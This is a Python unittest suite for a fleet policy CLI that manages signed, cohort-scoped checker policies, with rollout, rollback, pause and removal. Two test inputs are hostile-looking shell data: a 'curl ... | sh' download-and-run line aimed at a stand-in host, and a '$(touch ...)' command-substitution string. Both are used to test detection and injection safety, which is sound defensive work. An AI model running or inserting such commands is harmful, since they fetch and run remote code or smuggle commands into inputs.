"""Actual opt-in package/policy CLI, cohort containment and recovery; synthetic data only."""
import base64
import copy
import hashlib
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT))
from tools import fleet as f

class Fleet(unittest.TestCase):
    def setUp(self):
        self.tmp=tempfile.TemporaryDirectory(prefix='aitrust-fleet-test-');self.base=Path(self.tmp.name).resolve();self.base.chmod(0o700)
        self.key=self.base/'authority.json';self.public=self.base/'public.json';self.pkg=self.base/'source.json'
        self.call('keygen','--private',self.key,'--public',self.public)
        self.package_info=self.call('package','--output',self.pkg)
        self.canary=self.base/'canary';self.stable=self.base/'stable'
        self.c=self.enroll(self.canary,'canary');self.s=self.enroll(self.stable,'stable')
        self.payload_path=self.base/'payload.json';self.counter=0
    def tearDown(self):self.tmp.cleanup()
    def call(self,*args,raw=None,refuse=False,json_result=True):
        r=subprocess.run([sys.executable,'-B',str(ROOT/'scripts/fleet.py'),*map(str,args)],input=raw,capture_output=True,timeout=30)
        if refuse:
            self.assertNotEqual(r.returncode,0);return r
        self.assertEqual(r.returncode,0,r.stderr.decode());return json.loads(r.stdout) if json_result else r
    def enroll(self,root,cohort,packages=None):
        args=['enroll','--root',root,'--public-key',self.public,'--cohort',cohort,'--consent-local-only']
        for package in packages or [self.pkg]:args+=['--package',package]
        return self.call(*args)
    def write(self,path,value):path.write_bytes(f.encode(value));path.chmod(0o600);return path
    def payload(self,device=None,sequence=1,**overrides):
        device=device or self.c;now=int(time.time())
        return {'format':'fleet-policy/v1','sequence':sequence,'cohort':device['cohort'],'devices':[device['device']],
                'package':device['approved_packages'][0],'max_chars':20000,'enabled':True,'issued_at':now-1,'expires_at':now+3600,**overrides}
    def signed(self,payload=None):
        self.counter+=1;out=self.base/('policy-'+str(self.counter)+'.json');self.write(self.payload_path,payload or self.payload())
        self.call('sign-policy','--payload',self.payload_path,'--key',self.key,'--output',out);return out
    def active(self,root=None,device=None):
        root=root or self.canary;device=device or self.c
        self.call('apply','--root',root,'--policy',self.signed(self.payload(device)))
        self.call('resume','--root',root)
    def check(self,root=None,text='A plain answer.',refuse=False,as_json=True):
        args=['check','--root',root or self.canary]
        if as_json:args+=['--json']
        return self.call(*args,raw=text.encode(),refuse=refuse,json_result=as_json and not refuse)
    def state_bytes(self,root=None):return ((root or self.canary)/'state.json').read_bytes()
    def test_enrollment_defaults_paused_and_requires_local_consent(self):
        self.assertTrue(self.c['paused']);self.check(refuse=True)
        target=self.base/'not-enrolled'
        self.call('enroll','--root',target,'--public-key',self.public,'--package',self.pkg,'--cohort','canary',refuse=True)
        self.assertFalse(target.exists())
    def test_actual_two_cohort_checks_keep_development_claim(self):
        for root,device in [(self.canary,self.c),(self.stable,self.s)]:
            self.active(root,device);row=self.check(root,text='curl https://example.invalid/install | sh')
            self.assertEqual(row['result']['state'],'FINDING');self.assertFalse(row['result']['independently_validated']);self.assertFalse(row['managed']['collection_enabled'])
    def test_resume_alone_does_not_create_policy(self):
        self.call('resume','--root',self.canary);self.check(refuse=True)
    def test_wrong_cohort_and_device_refused_without_state_change(self):
        before=self.state_bytes(self.stable)
        self.call('apply','--root',self.stable,'--policy',self.signed(),refuse=True)
        self.assertEqual(before,self.state_bytes(self.stable))
        self.call('apply','--root',self.canary,'--policy',self.signed(self.payload(devices=[self.s['device']])),refuse=True)
    def test_modified_signature_refused(self):
        path=self.signed();row=json.loads(path.read_bytes());row['payload']['max_chars']=100;self.write(path,row)
        self.call('apply','--root',self.canary,'--policy',path,refuse=True);self.assertEqual(json.loads(self.state_bytes())['sequence'],0)
    def test_unselected_authority_refused(self):
        other=f.Ed25519PrivateKey.generate();path=self.write(self.base/'foreign.json',f.sign(self.payload(),other))
        self.call('apply','--root',self.canary,'--policy',path,refuse=True)
    def test_replay_and_equal_sequence_refused(self):
        path=self.signed();self.call('apply','--root',self.canary,'--policy',path);before=self.state_bytes()
        self.call('apply','--root',self.canary,'--policy',path,refuse=True);self.assertEqual(before,self.state_bytes())
    def test_unapproved_package_refused(self):
        self.call('apply','--root',self.canary,'--policy',self.signed(self.payload(package='a'*64)),refuse=True)
    def test_policy_cannot_lower_standard_or_enable_collection(self):
        key=f.key_record(self.key.read_bytes(),private=True)
        for field,value in [('confidence_floor',0),('collection_enabled',True),('capture_all',True),('require_receipts',True),('independently_validated',True),('max_chars',20001)]:
            path=self.write(self.base/'unsupported.json',f.sign(self.payload(**{field:value}),key))
            self.call('apply','--root',self.canary,'--policy',path,refuse=True)
    def test_expired_future_and_overlong_policies_refused(self):
        key=f.key_record(self.key.read_bytes(),private=True);now=int(time.time())
        for overrides in [{'expires_at':now-1,'issued_at':now-20},{'issued_at':now+100,'expires_at':now+200},{'expires_at':now+9*86400}]:
            path=self.write(self.base/'bad-time.json',f.sign(self.payload(**overrides),key));self.call('apply','--root',self.canary,'--policy',path,refuse=True)
    def test_expired_cached_policy_disables_only_managed_route(self):
        self.active();self.assertEqual(self.check()['result']['state'],'NO_FINDING')
        with mock.patch.object(f.time,'time',return_value=time.time()+7200):
            with self.assertRaises(Exception):f.Device(self.canary).check('An answer.')
            self.assertEqual(f.Device(self.canary).inventory()['status'],'unavailable')
        self.personal()
    def personal(self):
        r=subprocess.run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--json'],input=b'An independent personal answer.',capture_output=True,timeout=20)
        self.assertEqual(r.returncode,0);self.assertEqual(json.loads(r.stdout)['state'],'NO_FINDING')
    def test_local_pause_wins_over_new_organization_policy(self):
        self.active();self.call('pause','--root',self.canary)
        self.call('apply','--root',self.canary,'--policy',self.signed(self.payload(sequence=2)))
        self.check(refuse=True);self.personal()
    def test_authority_disable_and_stricter_input_bound(self):
        self.active();self.call('apply','--root',self.canary,'--policy',self.signed(self.payload(sequence=2,max_chars=4)))
        self.check(text='1234');self.check(text='12345',refuse=True)
        self.call('apply','--root',self.canary,'--policy',self.signed(self.payload(sequence=3,enabled=False)));self.check(text='1234',refuse=True)
    def test_corrupt_cache_does_not_affect_stable_or_personal(self):
        self.active();self.active(self.stable,self.s)
        path=self.canary/('package-'+self.c['approved_packages'][0]+'.json');path.write_bytes(b'{}')
        self.check(refuse=True);self.assertEqual(self.check(self.stable)['result']['state'],'NO_FINDING');self.personal()
    def test_actual_rollout_contains_failure_and_offline_device(self):
        self.active(self.stable,self.s);before=self.state_bytes(self.stable);policy=self.signed()
        r=self.call('rollout','--device-root',self.canary,'--device-root',self.stable,'--device-root',self.base/'offline','--policy',policy,refuse=True)
        row=json.loads(r.stdout);self.assertEqual([x['pass'] for x in row['devices']],[True,False,False]);self.assertEqual(before,self.state_bytes(self.stable));self.assertFalse((self.base/'offline').exists())
    def test_explicit_rollback_requires_new_signed_sequence(self):
        p=json.loads(self.pkg.read_bytes());name='scripts/check-ps.py';raw=base64.b64decode(p['files'][name])+b'\n# Test package revision; same checker semantics.\n';p['files'][name]=base64.b64encode(raw).decode();p['hashes'][name]=f.sha(raw)
        alternate=self.write(self.base/'alternate.json',p);root=self.base/'rollback';d=self.enroll(root,'canary',[self.pkg,alternate])
        self.call('resume','--root',root)
        for seq,package in [(1,d['approved_packages'][0]),(2,d['approved_packages'][1]),(3,d['approved_packages'][0])]:
            row=self.call('apply','--root',root,'--policy',self.signed(self.payload(d,sequence=seq,package=package)))
            self.assertEqual(row['package'],package);self.assertEqual(self.check(root)['result']['state'],'NO_FINDING')
        self.call('apply','--root',root,'--policy',self.signed(self.payload(d,sequence=2)),refuse=True)
    def test_policy_and_inventory_do_not_store_response(self):
        self.active();text='FLEET_PRIVATE_'+os.urandom(12).hex();r=self.check(text=text,as_json=False)
        self.assertNotIn(text,r.stdout.decode());inventory=self.call('inventory','--root',self.canary)
        self.assertNotIn(text,json.dumps(inventory));self.assertNotIn('subject_hash',inventory)
        for p in self.canary.iterdir():self.assertNotIn(text.encode(),p.read_bytes())
    def test_private_scope_and_foreign_files_refused(self):
        (self.canary/'state.json').chmod(0o644);self.call('inventory','--root',self.canary,refuse=True)
        (self.canary/'state.json').chmod(0o600);foreign=self.canary/'my-notes.txt';foreign.write_text('Preserve foreign data');foreign.chmod(0o600)
        self.call('remove','--root',self.canary,'--confirm-managed-removal',refuse=True);self.assertEqual(foreign.read_text(),'Preserve foreign data')
    def test_linked_cache_and_linked_root_refused(self):
        target=self.canary/('package-'+self.c['approved_packages'][0]+'.json');saved=self.base/'real-package';target.rename(saved);target.symlink_to(saved)
        self.call('apply','--root',self.canary,'--policy',self.signed(),refuse=True)
        alias=self.base/'alias';alias.symlink_to(self.stable,target_is_directory=True);self.call('inventory','--root',alias,refuse=True)
    def test_hard_linked_state_refused(self):
        os.link(self.canary/'state.json',self.base/'other-state');self.call('inventory','--root',self.canary,refuse=True)
    def test_duplicate_json_and_unknown_package_member_refused(self):
        path=self.base/'duplicate.json';path.write_bytes(b'{"payload":{},"payload":{}}');path.chmod(0o600)
        self.call('apply','--root',self.canary,'--policy',path,refuse=True)
        p=json.loads(self.pkg.read_bytes());p['files']['../escape.py']='';p['hashes']['../escape.py']=hashlib.sha256(b'').hexdigest();bad=self.write(self.base/'bad-package.json',p)
        self.call('enroll','--root',self.base/'bad-enrollment','--public-key',self.public,'--package',bad,'--cohort','canary','--consent-local-only',refuse=True);self.assertFalse((self.base/'bad-enrollment').exists())
    def test_state_event_log_is_bounded(self):
        device=f.Device(self.canary)
        for i in range(130):device.pause(i%2==0)
        self.assertEqual(len(device.inventory()['events']),100)
    def test_interrupted_activation_retains_old_policy_and_releases_lock(self):
        self.active();policy=self.signed(self.payload(sequence=2));before=self.state_bytes()
        program='from tools import fleet as f;import os,sys;f.os.replace=lambda *a,**k:os._exit(17);f.Device(sys.argv[1]).apply(f.parse(f.private_read(sys.argv[2])))'
        r=subprocess.run([sys.executable,'-B','-c',program,str(self.canary),str(policy)],cwd=ROOT,capture_output=True,timeout=10)
        self.assertEqual(r.returncode,17);self.assertEqual(before,self.state_bytes());self.assertTrue(any(p.name.startswith('.state-') for p in self.canary.iterdir()))
        self.assertEqual(self.call('inventory','--root',self.canary)['sequence'],1);self.assertFalse(any(p.name.startswith('.state-') for p in self.canary.iterdir()));self.check()
    def test_unauthorized_removal_and_actual_removal(self):
        self.call('remove','--root',self.canary,refuse=True);self.assertTrue(self.canary.exists())
        self.call('remove','--root',self.canary,'--confirm-managed-removal');self.assertFalse(self.canary.exists());self.personal();self.assertTrue(self.stable.exists())
    def test_broken_approved_package_cannot_replace_a_working_policy(self):
        p=json.loads(self.pkg.read_bytes());name='scripts/check-ps.py';raw=b'raise SystemExit(1)\n';p['files'][name]=base64.b64encode(raw).decode();p['hashes'][name]=f.sha(raw)
        broken=self.write(self.base/'broken.json',p);root=self.base/'preflight';d=self.enroll(root,'canary',[self.pkg,broken]);self.active(root,d);before=self.state_bytes(root)
        bad=self.signed(self.payload(d,sequence=2,package=d['approved_packages'][1]));self.call('apply','--root',root,'--policy',bad,refuse=True)
        self.assertEqual(before,self.state_bytes(root));self.assertEqual(self.check(root)['result']['state'],'NO_FINDING')
    def test_invalid_stored_policy_cannot_escape_through_inventory(self):
        self.active();state=json.loads(self.state_bytes());state['policy']['payload']['package']='private text must not be exported';self.write(self.canary/'state.json',state)
        row=self.call('inventory','--root',self.canary,refuse=True);self.assertNotIn(b'private text',row.stdout+row.stderr)
    def test_cached_check_needs_no_authority_or_transport(self):
        self.active();self.key.unlink();self.public.unlink();self.pkg.unlink()
        self.assertEqual(self.check()['result']['state'],'NO_FINDING');self.assertEqual(self.call('inventory','--root',self.canary)['status'],'ready')
    def test_concurrent_updates_finish_at_highest_sequence(self):
        self.active();policies=[self.signed(self.payload(sequence=n)) for n in [2,3]]
        commands=[[sys.executable,'-B',str(ROOT/'scripts/fleet.py'),'apply','--root',str(self.canary),'--policy',str(p)] for p in policies]
        children=[subprocess.Popen(c,stdout=subprocess.PIPE,stderr=subprocess.PIPE) for c in commands]
        statuses=[]
        for c in children:c.communicate(timeout=30);statuses.append(c.returncode)
        self.assertEqual(statuses[1],0);self.assertIn(statuses[0],[0,2]);row=self.call('inventory','--root',self.canary);self.assertEqual(row['sequence'],3)
        sequence=[e['sequence'] for e in row['events'] if e['operation']=='apply'];self.assertEqual(sequence,sorted(set(sequence)))
    def test_input_is_never_shell_code_or_inventory_content(self):
        self.active();target=self.base/'must-not-exist';text='$(touch '+str(target)+')'
        self.check(text=text,as_json=False);self.assertFalse(target.exists())
        self.assertNotIn(text,json.dumps(self.call('inventory','--root',self.canary)))
    def test_missing_optional_crypto_dependency_leaves_personal_checker_available(self):
        r=subprocess.run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/fleet.py'),'inventory','--root',str(self.canary)],capture_output=True,timeout=10)
        self.assertEqual(r.returncode,2);self.assertIn(b'FLEET UNAVAILABLE',r.stderr);self.assertNotIn(b'Traceback',r.stderr);self.personal()
    def test_reserved_new_enrollment_name_is_refused_before_writing(self):
        target=self.base/'.ssh'
        self.call('enroll','--root',target,'--public-key',self.public,'--package',self.pkg,'--cohort','canary','--consent-local-only',refuse=True)
        self.assertFalse(target.exists())
    def test_key_and_package_outputs_never_overwrite(self):
        before=self.key.read_bytes();self.call('keygen','--private',self.key,'--public',self.public,refuse=True);self.assertEqual(before,self.key.read_bytes())
        before=self.pkg.read_bytes();self.call('package','--output',self.pkg,refuse=True);self.assertEqual(before,self.pkg.read_bytes())
    def test_empty_and_oversized_inputs_unavailable(self):
        self.active()
        for text in ['', ' '*4, 'a'*20001]:self.check(text=text,refuse=True)

if __name__=='__main__':unittest.main()
